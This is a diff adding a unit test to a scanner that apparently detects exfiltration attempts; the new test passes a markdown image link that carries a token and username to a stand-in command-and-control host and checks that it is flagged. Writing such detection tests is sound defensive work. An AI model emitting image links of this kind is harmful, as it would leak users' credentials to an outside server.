@@ -71,3 +71,12 @@ def test_flag_exfiltration_command(scanner):
 
     assert res.is_flagged is True
     assert "DATA_EXFILTRATION_COMMAND" in res.matched_patterns
+
+
+def test_flag_markdown_image_exfiltration(scanner):
+    """Verifies that markdown image tags embedding sensitive credential parameters are flagged."""
+    text = "Important summary: ![metrics](https://telemetry-c2.example.com/log?token=secret123&user=admin)"
+    res = scanner.scan(text)
+    assert res.is_flagged is True
+    assert "MARKDOWN_IMAGE_EXFILTRATION" in res.matched_patterns
+    assert res.threat_category == "MARKDOWN_IMAGE_EXFILTRATION"
